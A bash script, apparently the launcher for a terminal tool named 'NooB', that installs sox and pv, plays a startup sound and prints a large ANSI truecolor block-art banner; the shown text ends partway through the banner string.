#!/bin/bash
clear
cd NooB
play_func() {
  if ! hash sox>/dev/null 2>&1; then 
    apt install sox -y>/dev/null 2>&1| echo "installing package: sox"
  fi
  if ! hash pv >/dev/null 2>&1; then
    apt install pv >/dev/null 2>&1 | echo "installing package: pv"
  fi
  play "assets/NooB_sound/winxp.mp3" trim 0 2.5 >/dev/null 2>&1
}

banner() {
echo -e """
\033[1A[0m[38;2;253;242;244;48;2;254;240;245m▂[38;2;252;242;242m▃[38;2;255;240;246;48;2;252;241;244m┛[38;2;230;235;239;48;2;248;240;244m▗[38;2;211;226;235;48;2;239;238;241m▄[38;2;223;232;242;48;2;196;220;238m▘[38;2;160;205;235;48;2;185;217;237m▄[38;2;169;209;235;48;2;147;198;238m▘[38;2;122;181;240;48;2;140;192;238m▅[38;2;99;156;235;48;2;124;180;242m▃[38;2;116;172;239;48;2;102;155;236m▘[38;2;85;136;231;48;2;100;155;236m▄[38;2;91;145;236;48;2;104;159;239m▖[38;2;98;147;242;48;2;112;168;247m▝[38;2;93;146;236;48;2;84;134;232m▖[38;2;80;129;232;48;2;92;140;241m▄[38;2;81;130;238;48;2;92;139;238m▄[38;2;83;132;240;48;2;90;136;236m▄[38;2;81;131;239;48;2;85;130;238m┄[38;2;80;127;238;48;2;88;132;235m▆[38;2;80;126;235;48;2;94;143;238m▄[38;2;84;131;238;48;2;99;148;238m▄[38;2;82;127;235;48;2;102;153;239m▄[38;2;82;127;236;48;2;102;155;242m▄[48;2;99;152;242m▄[38;2;78;124;233;48;2;93;146;238m▄[38;2;71;116;230;48;2;93;143;241m▅[38;2;73;116;230;48;2;90;135;241m▖[38;2;82;126;237;48;2;74;116;231m▍[38;2;71;109;230;48;2;74;115;230m▃[38;2;79;113;240;48;2;74;112;227m▆[38;2;67;96;227;48;2;70;100;226m▄[38;2;70;100;229;48;2;68;98;216m▇[38;2;78;107;237;48;2;71;100;228m▂[38;2;77;104;235;48;2;72;100;225m▅[38;2;75;102;234;48;2;72;100;222m▆[38;2;72;98;230;48;2;67;95;217m▆[38;2;69;97;224;48;2;74;99;231m▘[38;2;81;108;236;48;2;74;97;230m▘[38;2;63;80;220;48;2;66;90;220m▃[38;2;77;100;231;48;2;64;83;220m▝[38;2;65;89;224;48;2;75;106;231m▄[38;2;85;122;239;48;2;73;106;231m▝[38;2;80;120;234;48;2;92;139;239m▖[38;2;98;150;244;48;2;104;159;240m▄[38;2;101;158;237;48;2;115;174;235m▅[38;2;128;183;231;48;2;169;209;241m▆[38;2;166;203;237;48;2;207;221;243m▆[38;2;154;198;230;48;2;220;231;240m▅[38;2;159;200;231;48;2;226;234;240m▃[38;2;192;215;232;48;2;238;235;237m▂[38;2;245;234;227;48;2;252;235;225m▎[0m
[38;2;254;242;242;48;2;253;242;243m▄[38;2;251;238;243;48;2;251;243;242m▂[38;2;223;233;240;48;2;241;240;242m▗[38;2;224;232;236;48;2;205;226;237m▘[38;2;178;218;238;48;2;196;226;236m▃[38;2;181;217;235;48;2;162;209;238m▘[38;2;150;203;242;48;2;139;198;244m▋[38;2;112;173;245;48;2;129;190;245m▗[38;2;119;177;246;48;2;103;159;242m▘[38;2;84;136;237;48;2;94;148;240m▗[38;2;82;127;237;48;2;91;137;236m▅[38;2;74;115;233;48;2;88;133;242m▄[38;2;75;115;230;48;2;95;146;241m▄[38;2;82;123;234;48;2;106;159;244m▄[38;2;92;133;244;48;2;98;149;244m▄[38;2;88;134;238;48;2;82;123;235m▘[38;2;77;116;234;48;2;79;123;237m▃[38;2;78;118;236;48;2;81;125;239m▄[38;2;82;122;238;48;2;83;126;239m▄[38;2;86;128;241;48;2;84;124;239m━[38;2;89;130;244;48;2;80;121;236m▅[38;2;88;125;241;48;2;77;119;234m▃[38;2;79;116;234;48;2;74;106;233m▊[38;2;65;92;228;48;2;73;106;234m▄[38;2;69;96;229;48;2;77;112;235m▅[38;2;75;103;233;48;2;75;111;233m▅[38;2;77;105;235;48;2;74;110;232m▅[38;2;73;99;230;48;2;75;113;233m▅[38;2;70;94;227;48;2;80;115;239m▃[38;2;66;91;227;48;2;71;103;232m▃[38;2;68;95;232;48;2;72;103;234m▅[38;2;70;97;233;48;2;68;97;229m▅[38;2;69;97;229;48;2;78;107;236m▌[38;2;81;110;238;48;2;75;104;234m▘[38;2;78;106;234;48;2;75;102;233m▋[38;2;73;100;232;48;2;74;101;233m▆[38;2;72;96;230;48;2;69;91;227m▋[38;2;68;89;227;48;2;67;85;224m▘[38;2;69;84;225;48;2;64;82;221m▃[38;2;63;78;220;48;2;65;79;222m┹[38;2;65;80;223;48;2;64;77;223m▅[38;2;63;80;222;48;2;66;83;225m▚[38;2;68;88;226;48;2;72;96;232m▌[38;2;68;96;224;48;2;75;113;234m▅[38;2;83;125;236;48;2;90;139;240m▎[38;2;95;151;232;48;2;84;136;231m▝[38;2;102;151;240;48;2;127;185;242m▃[38;2;128;175;236;48;2;170;214;240m▄[38;2;192;218;241;48;2;165;202;235m▇[38;2;194;219;237;48;2;158;196;232m▅[38;2;162;199;228;48;2;187;204;216m▉[38;2;217;223;222;48;2;249;236;223m▎[0m
[38;2;251;240;246;48;2;253;243;245m▃[38;2;212;224;236;48;2;239;235;241m▗[38;2;184;219;243;48;2;207;227;238m▄[38;2;147;200;240;48;2;177;214;236m▃[38;2;131;189;236;48;2;154;202;233m▅[38;2;121;179;242;48;2;138;193;242m▅[38;2;102;157;240;48;2;124;183;245m▄[38;2;110;171;244;48;2;96;152;241m▘[38;2;92;147;241;48;2;91;143;242m▌[38;2;89;139;241;48;2;88;135;244m▋[38;2;87;133;244;48;2;86;128;241m▘[38;2;86;124;240;48;2;80;116;233m▋[38;2;75;109;231;48;2;77;112;233m┯[38;2;70;104;229;48;2;75;109;232m▂[38;2;74;106;232;48;2;80;114;235m▄[38;2;78;108;235;48;2;80;112;235m▅[38;2;71;102;229;48;2;75;107;233m━[38;2;69;100;228;48;2;75;107;232m▅[38;2;73;102;232;48;2;79;113;236m▅[38;2;68;96;230;48;2;76;110;234m▄[38;2;69;92;229;48;2;69;101;226m▅[38;2;65;83;222;48;2;72;104;229m▆[38;2;63;77;220;48;2;77;104;234m▆[38;2;61;74;219;48;2;68;89;228m▅[38;2;59;75;219;48;2;72;93;232m▅[38;2;61;78;220;48;2;73;94;233m▅[38;2;63;78;221;48;2;75;96;234m▅[38;2;63;78;222;48;2;70;89;227m▖[38;2;73;95;229;48;2;64;85;220m▃[38;2;70;95;225;48;2;83;110;239m▎[38;2;81;111;234;48;2;68;97;228m▃[38;2;69;90;230;48;2;71;97;232m▗[38;2;63;82;222;48;2;67;92;229m▃[38;2;72;94;230;48;2;76;102;235m▃[38;2;72;94;229;48;2;77;104;234m▃[38;2;64;82;223;48;2;78;102;235m▄[38;2;60;72;218;48;2;64;85;223m▅[38;2;64;75;219;48;2;65;80;223m▄[38;2;66;79;221;48;2;69;84;225m▅[38;2;69;82;223;48;2;69;84;226m▍[38;2;65;82;224;48;2;68;85;226m▝[38;2;65;80;221;48;2;63;77;218m▋[38;2;63;78;219;48;2;64;82;221m▌[38;2;64;84;221;48;2;67;94;224m▊[38;2;101;148;248;48;2;82;116;234m▝[38;2;81;124;231;48;2;93;133;242m▝[38;2;92;135;240;48;2;82;123;231m▝[38;2;86;128;234;48;2;99;144;238m▄[38;2;99;144;235;48;2;138;179;235m▆[38;2;121;166;227;48;2;177;218;241m▃[38;2;185;219;239;48;2;192;207;219m▋[38;2;224;224;221;48;2;251;236;227m▎[0m
[38;2;198;219;242;48;2;239;239;247m▗[38;2;160;209;238;48;2;197;223;241m▄[38;2;170;215;247;48;2;143;196;239m▘[38;2;148;206;246;48;2;137;195;235m▗[38;2;115;167;236;48;2;141;198;246m▗[38;2;118;169;245;48;2;90;136;231m▘[38;2;97;139;247;48;2;90;139;235m▃[38;2;81;120;232;48;2;92;142;239m▃[38;2;80;117;235;48;2;93;142;242m▂[38;2;94;134;247;48;2;89;135;242m▃[38;2;84;125;240;48;2;79;120;235m▃[38;2;84;125;239;48;2;79;120;233m▝[38;2;84;123;239;48;2;78;116;236m▘[38;2;75;108;233;48;2;72;102;230m▄[38;2;74;103;231;48;2;72;101;230m▖[38;2;71;99;231;48;2;75;103;235m▃[38;2;73;101;234;48;2;79;108;240m▄[38;2;75;104;236;48;2;72;101;233m▌[38;2;72;101;232;48;2;73;101;234m▅[38;2;78;105;240;48;2;68;95;230m▅[38;2;72;95;232;48;2;64;84;223m▖[38;2;62;75;216;48;2;69;83;224m▗[38;2;62;73;216;48;2;72;84;226m▃[38;2;62;73;217;48;2;71;81;226m▝[38;2;66;79;223;48;2;61;71;216m▃[38;2;64;75;219;48;2;65;75;220m▄[38;2;65;78;221;48;2;63;75;219m▄[38;2;63;77;221;48;2;66;83;224m▘[38;2;70;87;229;48;2;75;96;235m▄[38;2;64;86;222;48;2;68;90;227m┏[38;2;71;90;228;48;2;84;109;241m▄[38;2;70;92;228;48;2;63;78;220m▘[38;2;62;72;216;48;2;63;77;220m▃[38;2;63;73;217;48;2;66;82;222m▆[38;2;64;73;215;48;2;64;80;220m▆[38;2;61;70;215;48;2;62;75;219m▃[38;2;62;73;217;48;2;64;74;221m▆[38;2;61;72;216;48;2;64;75;219m▉[38;2;65;76;220;48;2;71;84;227m▎[38;2;66;83;224;48;2;69;84;226m▗[38;2;68;85;225;48;2;69;86;226m▅[38;2;67;82;223;48;2;68;82;223m▂[38;2;68;80;224;48;2;67;80;222m▗[38;2;68;81;224;48;2;65;82;222m▆[38;2;65;92;223;48;2;64;83;221m▝[38;2;68;95;223;48;2;86;119;238m▖[38;2;86;120;237;48;2;74;110;227m▌[38;2;73;108;229;48;2;81;122;233m▅[38;2;75;110;231;48;2;84;126;236m▅[38;2;102;143;222;48;2;77;116;228m▝[38;2;97;127;226;48;2;167;190;231m▖[38;2;221;222;230;48;2;249;237;228m▎[0m
[38;2;228;236;249;48;2;174;207;240m▌[38;2;134;190;232;48;2;144;200;238m▖[38;2;147;205;250;48;2;143;199;243m┳[38;2;111;163;240;48;2;137;192;245m▅[38;2;80;127;232;48;2;106;157;239m▆[38;2;86;128;239;48;2;90;131;245m▌[38;2;77;110;230;48;2;88;125;241m▗[38;2;79;108;231;48;2;73;98;228m▘[38;2;64;89;221;48;2;68;101;226m▇[38;2;65;95;223;48;2;81;116;233m▆[38;2;72;107;229;48;2;84;124;237m▄[38;2;82;122;239;48;2;86;127;241m▂[38;2;84;124;239;48;2;81;122;238m▖[38;2;77;110;233;48;2;80;118;237m▝[38;2;76;111;234;48;2;75;106;232m▃[38;2;75;107;236;48;2;74;104;235m╸[38;2;73;99;235;48;2;73;100;234m╷[38;2;72;98;233;48;2;72;100;231m▅[38;2;71;95;231;48;2;72;99;231m▃[38;2;76;102;236;48;2;72;96;230m▝[38;2;70;92;228;48;2;78;103;237m▃[38;2;71;96;230;48;2;79;100;236m▄[38;2;70;90;228;48;2;61;76;216m▅[38;2;68;84;227;48;2;64;80;222m▝[38;2;70;87;228;48;2;66;83;225m▚[38;2;69;84;226;48;2;65;78;222m▃[38;2;69;85;226;48;2;65;79;222m▂[38;2;66;82;224;48;2;68;82;225m▍[38;2;65;80;222;48;2;67;81;224m╼[38;2;76;92;232;48;2;67;81;222m▝[38;2;73;90;231;48;2;65;78;221m▘[38;2;62;71;214;48;2;62;73;218m▅[38;2;60;63;206;48;2;61;66;212m▃[38;2;60;62;209;48;2;58;58;200m▘[38;2;58;61;198;48;2;59;65;206m▅[38;2;58;64;205;48;2;58;66;210m▄[38;2;59;66;211;48;2;58;69;213m▆[38;2;61;71;214;48;2;63;77;218m▊[38;2;67;82;223;48;2;71;87;228m▍[38;2;71;90;227;48;2;67;83;225m▃[38;2;73;98;233;48;2;68;85;225m▃[38;2;73;100;235;48;2;69;87;226m▄[38;2;72;96;232;48;2;66;84;223m▃[38;2;70;91;229;48;2;66;82;223m▂[38;2;63;79;220;48;2;59;76;216m▍[38;2;62;81;218;48;2;73;97;229m▌[38;2;85;117;244;48;2;78;110;238m┙[38;2;66;92;225;48;2;73;103;231m▗[38;2;66;90;225;48;2;74;104;233m▅[38;2;66;88;228;48;2;72;104;232m▄[38;2;80;104;224;48;2;120;127;202m▊[38;2;199;194;228;48;2;250;234;230m▎[0m
[38;2;218;235;249;48;2;137;183;231m▌[38;2;107;164;239;48;2;127;185;242m▅[38;2;102;155;240;48;2;126;184;243m▆[38;2;93;143;236;48;2;83;131;235m▍[38;2;81;129;233;48;2;75;121;228m▃[38;2;90;136;243;48;2;86;128;240m▃[38;2;85;122;239;48;2;76;108;230m▍[38;2;79;111;236;48;2;71;99;228m▗[38;2;82;114;238;48;2;70;97;229m▄[38;2;78;108;234;48;2;69;97;228m▅[38;2;72;106;230;48;2;77;109;233m▃[38;2;73;107;232;48;2;80;117;238m▄[38;2;69;102;229;48;2;78;115;235m▄[38;2;99;138;249;48;2;84;120;237m▗[38;2;89;126;240;48;2;80;116;236m▖[38;2;81;111;236;48;2;76;106;234m▖[38;2;76;102;236;48;2;73;100;234m▅[38;2;76;102;238;48;2;72;98;234m▅[38;2;77;103;239;48;2;71;95;231m▃[38;2;74;101;237;48;2;70;93;230m▂[38;2;69;91;228;48;2;72;96;233m▋[38;2;69;94;230;48;2;78;102;238m▝[38;2;73;99;233;48;2;64;88;226m▃[38;2;74;98;233;48;2;70;91;229m▃[38;2;70;92;230;48;2;68;87;226m▋[38;2;65;82;222;48;2;69;85;225m▅[38;2;68;85;225;48;2;72;89;229m▆[38;2;67;84;224;48;2;66;82;224m▌[38;2;63;76;219;48;2;66;79;222m▗[38;2;65;74;219;48;2;63;74;216m▄[38;2;63;72;214;48;2;66;74;217m▗[38;2;65;73;216;48;2;59;65;205m▘[38;2;54;53;189;48;2;55;57;195m▗[38;2;56;55;189;48;2;56;55;193m▄[38;2;56;58;195;48;2;57;56;192m▝[38;2;59;62;203;48;2;57;59;198m▝[38;2;63;69;214;48;2;59;62;206m▝[38;2;62;70;214;48;2;63;77;219m▊[38;2;65;80;222;48;2;73;90;231m▎[38;2;72;94;233;48;2;71;91;229m▄[38;2;80;117;239;48;2;75;107;237m▗[38;2;80;116;237;48;2;76;108;236m▃[38;2;66;94;225;48;2;73;107;232m▝[38;2;74;109;235;48;2;69;96;229m▃[38;2;70;95;231;48;2;62;82;223m▌[38;2;64;81;223;48;2;67;86;226m▌[38;2;74;99;236;48;2;68;88;227m▝[38;2;76;100;237;48;2;68;86;226m▘[38;2;65;80;223;48;2;69;86;226m▄[38;2;71;88;227;48;2;67;81;225m▘[38;2;67;79;212;48;2;97;100;185m▊[38;2;155;153;197;48;2;243;232;234m▏[0m
[38;2;217;234;250;48;2;139;186;234m▌[38;2;112;169;240;48;2;119;176;246m▚[38;2;90;142;231;48;2;104;158;238m▝[38;2;106;158;241;48;2;82;133;228m▃[38;2;102;151;240;48;2;84;136;235m▅[38;2;85;126;236;48;2;91;137;241m▗[38;2;77;114;235;48;2;83;123;238m▂[38;2;80;115;236;48;2;86;120;241m▃[38;2;84;118;238;48;2;81;114;234m▍[38;2;78;110;234;48;2;76;107;230m▌[38;2;79;108;234;48;2;73;105;230m▅[38;2;63;91;215;48;2;74;102;230m▃[38;2;78;110;233;48;2;66;96;223m▗[38;2;77;112;233;48;2;82;119;236m▆[38;2;78;108;234;48;2;82;117;237m▆[38;2;66;84;222;48;2;76;100;230m▗[38;2;62;76;219;48;2;70;93;230m▆[38;2;63;78;220;48;2;73;98;235m▆[38;2;65;81;222;48;2;74;101;237m▅[38;2;68;87;226;48;2;72;98;234m▄[38;2;71;88;228;48;2;72;96;233m▁[38;2;72;96;231;48;2;75;99;235m━[38;2;73;100;232;48;2;78;105;235m▆[48;2;72;98;234m▋[38;2;72;97;234;48;2;69;91;229m▊[38;2;67;88;226;48;2;64;84;223m▅[38;2;72;89;229;48;2;68;85;225m▝[38;2;70;86;226;48;2;66;82;223m▘[38;2;67;81;223;48;2;64;78;220m▂[38;2;63;75;219;48;2;64;71;216m▍[38;2;65;70;217;48;2;64;69;214m▋[38;2;61;65;208;48;2;59;60;201m▋[38;2;58;56;194;48;2;55;52;186m▌[38;2;54;50;171;48;2;58;55;183m▄[38;2;55;51;173;48;2;56;53;186m▄[38;2;56;53;185;48;2;56;54;192m▖[38;2;59;57;198;48;2;58;59;203m▎[38;2;60;64;210;48;2;62;72;216m▋[38;2;64;78;221;48;2;66;84;227m▍[38;2;68;87;226;48;2;71;96;226m▋[38;2;74;107;228;48;2;84;125;236m▋[38;2;77;117;230;48;2;92;135;241m▝[38;2;85;126;239;48;2;80;119;236m▃[38;2;80;119;237;48;2;76;114;233m▎[38;2;79;110;236;48;2;72;95;228m▋[38;2;64;84;220;48;2;62;78;218m▖[38;2;60;72;216;48;2;65;77;222m▃[38;2;65;77;221;48;2;63;75;218m▚[38;2;64;76;220;48;2;62;75;218m▂[38;2;62;73;220;48;2;64;76;221m▅[38;2;70;79;215;48;2;93;96;186m▊[38;2;174;172;207;48;2;246;236;235m▎[0m
[38;2;218;233;251;48;2;135;179;235m▌[38;2;91;138;238;48;2;112;167;244m▅[38;2;81;124;232;48;2;111;163;245m▆[38;2;75;112;231;48;2;99;147;242m▅[38;2;65;96;222;48;2;89;129;236m▅[38;2;68;96;228;48;2;73;105;230m▄[38;2;76;104;235;48;2;73;104;231m▂[38;2;88;122;245;48;2;76;107;234m▝[38;2;72;100;231;48;2;88;122;244m▄[38;2;63;88;219;48;2;75;106;232m▅[38;2;66;94;221;48;2;59;85;213m▚[38;2;65;93;217;48;2;89;128;239m▘[38;2;90;130;242;48;2;81;123;236m▍[38;2;81;117;235;48;2;79;109;233m▋[38;2;63;78;216;48;2;75;98;230m▃[38;2;57;72;212;48;2;65;81;220m▄[38;2;64;81;223;48;2;63;75;219m▄[38;2;65;82;224;48;2;66;78;222m▄[38;2;66;83;225;48;2;67;80;224m▃[38;2;65;84;225;48;2;66;81;224m▃[38;2;67;82;225;48;2;65;83;225m▘[38;2;64;85;223;48;2;71;91;230m▇[38;2;64;87;223;48;2;71;94;231m▄[38;2;63;85;222;48;2;71;97;231m▗[38;2;58;77;216;48;2;71;93;231m▃[38;2;70;85;226;48;2;65;83;223m▃[38;2;70;83;224;48;2;66;81;222m▖[38;2;73;88;229;48;2;66;79;221m▝[38;2;71;86;227;48;2;69;83;225m━[38;2;69;79;223;48;2;63;69;215m▊[38;2;62;68;213;48;2;61;65;215m▌[38;2;60;65;210;48;2;59;62;204m▋[38;2;59;59;197;48;2;56;53;185m▍[38;2;54;50;178;48;2;54;51;172m▍[38;2;56;55;176;48;2;53;51;170m▄[38;2;59;57;190;48;2;55;52;184m▄[38;2;58;57;195;48;2;59;61;201m▌[38;2;60;70;212;48;2;58;64;206m▝[38;2;68;84;227;48;2;59;72;217m▝[38;2;60;79;218;48;2;70;92;227m▖[38;2;84;117;237;48;2;87;131;236m▋[38;2;80;127;229;48;2;98;149;238m▃[38;2;95;143;243;48;2;83;131;236m▘[38;2;91;140;242;48;2;77;122;232m▂[38;2;91;141;239;48;2;74;115;231m▃[38;2;76;110;231;48;2;66;91;223m▅[38;2;63;77;218;48;2;58;68;213m▍[38;2;58;70;214;48;2;61;74;217m▍[38;2;61;76;218;48;2;62;73;219m▎[38;2;65;72;222;48;2;62;72;222m▎[38;2;61;72;210;48;2;84;91;183m▊[38;2;163;166;204;48;2;243;238;239m▎[0m
[38;2;215;232;251;48;2;124;164;238m▌[38;2;91;139;238;48;2;79;119;236m▎[38;2;70;93;228;48;2;77;108;236m▗[38;2;62;85;223;48;2;65;89;226m┳[38;2;75;99;234;48;2;64;87;226m▃[38;2;69;93;232;48;2;77;100;238m▘[38;2;74;97;235;48;2;77;101;237m▅[38;2;70;92;230;48;2;71;95;231m▄[38;2;72;94;232;48;2;68;90;228m▋[38;2;70;98;226;48;2;62;84;220m▗[38;2;67;96;223;48;2;78;115;233m▘[38;2;94;140;248;48;2;87;130;242m╹[38;2;79;113;232;48;2;82;122;236m▄[38;2;85;116;240;48;2;66;85;219m▘[38;2;62;75;214;48;2;58;69;212m▎[38;2;59;73;216;48;2;67;82;224m▌[38;2;80;100;239;48;2;72;92;231m╺[38;2;76;102;236;48;2;68;86;226m▄[38;2;69;93;227;48;2;66;85;224m▃[38;2;66;89;224;48;2;67;86;227m▄[38;2;70;91;233;48;2;68;89;227m▝[38;2;77;106;231;48;2;73;95;231m▃[38;2;80;119;234;48;2;72;97;229m▅[38;2;85;123;239;48;2;80;104;237m▆[38;2;75;106;228;48;2;62;83;219m▃[38;2;72;86;228;48;2;63;78;219m▝[38;2;63;70;215;48;2;68;80;223m▃[38;2;65;75;219;48;2;63;74;218m▌[38;2;61;71;215;48;2;66;76;219m▄[38;2;62;70;215;48;2;66;74;219m▄[38;2;65;71;216;48;2;63;67;214m▌[38;2;59;64;209;48;2;57;61;202m▌[38;2;57;57;193;48;2;56;53;183m▌[38;2;53;51;174;48;2;55;53;177m▃[38;2;56;53;175;48;2;56;53;181m▌[38;2;60;59;202;48;2;57;54;192m▗[38;2;59;61;204;48;2;57;58;198m▃[38;2;56;61;202;48;2;57;63;206m▍[38;2;59;67;212;48;2;64;79;220m▌[38;2;66;90;222;48;2;76;108;229m▌[38;2;111;160;242;48;2;80;120;228m▃[38;2;110;164;238;48;2;90;137;237m▅[38;2;113;173;238;48;2;95;148;237m▄[38;2;118;179;240;48;2;106;162;240m▃[38;2;113;170;244;48;2;103;157;242m▃[38;2;102;150;239;48;2;81;121;229m▃[38;2;73;105;222;48;2;60;77;215m▖[38;2;60;74;219;48;2;66;79;221m▋[38;2;71;82;227;48;2;64;76;222m▆[38;2;65;77;224;48;2;62;73;222m▖[38;2;65;75;213;48;2;84;91;182m▊[38;2;159;160;202;48;2;244;239;238m▎[0m
[38;2;215;225;249;48;2;113;144;228m▌[38;2;81;120;234;48;2;76;108;234m▘[38;2;74;101;234;48;2;70;93;230m▍[38;2;69;92;230;48;2;71;95;232m▌[38;2;75;99;233;48;2;76;100;236m▆[38;2;75;99;234;48;2;72;94;232m▋[38;2;64;85;224;48;2;69;91;229m▅[38;2;67;89;227;48;2;68;90;228m╼[38;2;63;87;223;48;2;66;89;227m▃[38;2;72;99;228;48;2;78;109;234m▎[38;2;77;113;231;48;2;85;123;238m▊[38;2;74;104;228;48;2;86;123;241m▗[38;2;66;93;225;48;2;76;106;232m▅[38;2;66;85;224;48;2;63;81;221m▍[38;2;75;103;233;48;2;65;84;221m▗[38;2;81;109;238;48;2;72;98;231m▖[38;2;77;116;233;48;2;73;104;231m▗[38;2;79;121;234;48;2;76;111;233m▃[38;2;84;128;236;48;2;73;108;232m▃[38;2;84;130;233;48;2;68;102;228m▃[38;2;90;137;238;48;2;68;100;227m▃[38;2;100;150;240;48;2;76;117;233m▂[38;2;104;156;237;48;2;85;133;234m▄[38;2;122;174;245;48;2;96;145;239m▆[38;2;108;148;247;48;2;83;109;232m▋[38;2;65;87;222;48;2;59;73;218m▎[38;2;69;81;225;48;2;58;65;211m▂[38;2;70;84;225;48;2;60;69;213m▂[38;2;60;70;212;48;2;61;71;215m▆[38;2;60;69;210;48;2;60;68;210m▏[38;2;62;69;211;48;2;62;67;209m▘[38;2;60;64;205;48;2;58;61;198m▌[38;2;54;53;181;48;2;56;57;190m▝[38;2;55;53;182;48;2;54;52;176m▅[38;2;57;57;190;48;2;55;53;182m▗[38;2;65;65;205;48;2;57;58;196m▝[38;2;61;65;208;48;2;59;61;204m▗[38;2;56;63;204;48;2;57;65;209m▋[38;2;72;91;226;48;2;60;73;214m▗[38;2;73;105;226;48;2;96;140;235m▌[38;2;138;196;241;48;2;121;175;241m▗[38;2;149;204;242;48;2;118;177;234m▄[38;2;154;204;241;48;2;128;187;239m▄[38;2;150;203;240;48;2;128;188;236m▄[38;2;132;191;237;48;2;120;181;240m▄[38;2;128;185;241;48;2;119;175;248m▄[38;2;70;105;221;48;2;102;149;237m▝[38;2;72;104;226;48;2;61;84;223m▖[38;2;61;74;220;48;2;65;80;223m▗[38;2;59;74;220;48;2;63;75;224m▖[38;2;64;73;213;48;2;79;85;183m▊[38;2;153;153;200;48;2;245;241;234m▎[0m
[38;2;212;224;252;48;2;102;132;223m▌[38;2;72;99;224;48;2;71;97;235m▍[38;2;66;87;228;48;2;69;92;232m▗[38;2;63;85;223;48;2;68;92;228m▖[38;2;71;99;232;48;2;74;100;233m▖[38;2;74;97;232;48;2;73;93;231m▍[38;2;72;90;230;48;2;69;87;226m▇[38;2;65;79;220;48;2;72;89;229m▄[38;2;86;118;241;48;2;67;90;222m▗[38;2;88;127;241;48;2;81;119;237m▄[38;2;78;111;233;48;2;83;119;236m▚[38;2;84;115;238;48;2;65;88;220m▘[38;2;64;89;222;48;2;64;85;221m▃[38;2;77;110;232;48;2;67;93;223m▗[38;2;84;123;238;48;2;86;116;238m▃[38;2;81;126;235;48;2;72;105;226m▂[38;2;83;134;239;48;2;77;116;234m▂[38;2;81;128;234;48;2;87;138;238m▋[38;2;109;167;241;48;2;95;150;238m▗[38;2;106;166;239;48;2;92;148;233m▅[38;2;111;171;239;48;2;101;157;238m▆[38;2;121;180;241;48;2;113;170;237m▅[38;2;129;183;248;48;2;117;172;235m▆[38;2;80;120;231;48;2;109;157;240m▗[38;2;76;109;232;48;2;68;94;227m▌[38;2;74;99;231;48;2;63;82;222m▃[38;2;75;93;231;48;2;63;86;221m▝[38;2;94;133;243;48;2;70;89;223m▁[38;2;86;123;237;48;2;60;74;212m▂[38;2;70;98;220;48;2;58;68;206m▂[38;2;54;56;194;48;2;57;62;200m━[38;2;54;57;192;48;2;57;59;196m┙[38;2;58;60;194;48;2;57;56;190m▊[38;2;54;55;192;48;2;54;53;186m▅[38;2;69;78;219;48;2;58;60;199m▗[38;2;73;86;228;48;2;57;62;206m▃[38;2;66;83;222;48;2;60;68;211m▂[38;2;59;81;216;48;2;57;70;213m▂[38;2;63;84;215;48;2;86;119;231m▌[38;2;116;169;241;48;2;88;137;229m▅[38;2;146;201;236;48;2;128;181;232m▝[38;2;159;208;236;48;2;172;214;236m▍[38;2;182;216;237;48;2;174;214;240m▅[38;2;162;206;237;48;2;179;213;237m▝[38;2;168;208;238;48;2;150;200;238m▅[38;2;159;205;237;48;2;144;196;239m▄[38;2;118;166;246;48;2;144;192;243m▝[38;2;119;162;238;48;2;80;114;227m▖[38;2;69;95;217;48;2;61;78;217m▖[38;2;59;75;217;48;2;60;73;221m▋[38;2;61;71;212;48;2;76;81;187m▊[38;2;150;149;203;48;2;245;240;237m▎[0m
[38;2;213;225;251;48;2;100;128;225m▌[38;2;72;96;226;48;2;70;93;233m▍[38;2;66;86;227;48;2;68;90;231m▗[38;2;64;84;225;48;2;68;91;228m▖[38;2;81;105;238;48;2;74;98;234m▝[38;2;75;97;233;48;2;71;90;228m▌[38;2;66;84;223;48;2;64;82;220m▌[38;2;65;77;218;48;2;61;75;216m▘[38;2;67;94;219;48;2;92;132;239m▌[38;2;96;139;242;48;2;87;123;236m▋[38;2;81;110;231;48;2;64;87;221m▘[38;2;61;82;219;48;2;64;87;224m▌[38;2;63;90;223;48;2;73;105;231m▊[38;2;79;120;235;48;2;85;123;241m▂[38;2;72;117;228;48;2;78;125;234m┛[38;2;84;137;237;48;2;94;149;244m▌[38;2;102;162;238;48;2;95;149;242m▃[38;2;110;170;237;48;2;92;148;233m▅[38;2;123;186;244;48;2;110;173;240m▅[38;2;120;183;246;48;2;108;171;235m▌[38;2;109;172;234;48;2;119;181;240m▌[38;2;120;174;245;48;2;127;187;246m▗[38;2;83;122;230;48;2;116;161;247m▃[38;2;81;119;231;48;2;69;99;225m▘[38;2;81;115;238;48;2;72;104;229m▃[38;2;81;116;237;48;2;76;108;232m▖[38;2;64;97;227;48;2;68;107;223m▘[38;2;78;125;232;48;2;99;144;245m▖[38;2;101;155;242;48;2;106;156;248m▖[38;2;85;125;231;48;2;106;156;244m▝[38;2;91;129;239;48;2;71;92;221m▖[38;2;65;79;213;48;2;58;62;198m▖[38;2;59;58;194;48;2;56;58;195m▝[38;2;57;61;202;48;2;55;56;195m▅[38;2;55;64;207;48;2;60;80;219m▋[38;2;68;88;228;48;2;77;102;235m▂[38;2;79;107;236;48;2;75;98;231m▅[38;2;76;112;232;48;2;65;91;220m▃[38;2;80;117;225;48;2;103;151;240m▘[38;2;114;172;238;48;2;121;182;237m▌[38;2;127;189;238;48;2;137;193;240m▃[38;2;160;207;236;48;2;140;196;236m▝[38;2;155;202;239;48;2;185;217;238m▃[38;2;164;208;245;48;2;190;220;238m▂[38;2;169;209;245;48;2;185;218;238m▂[38;2;179;215;236;48;2;166;207;235m▘[38;2;156;207;240;48;2;160;205;240m▃[38;2;129;174;243;48;2;154;203;242m▝[38;2;141;188;250;48;2;97;131;239m▖[38;2;76;106;231;48;2;65;83;223m▖[38;2;57;70;210;48;2;71;76;183m▊[38;2;141;144;198;48;2;245;241;238m▎[0m
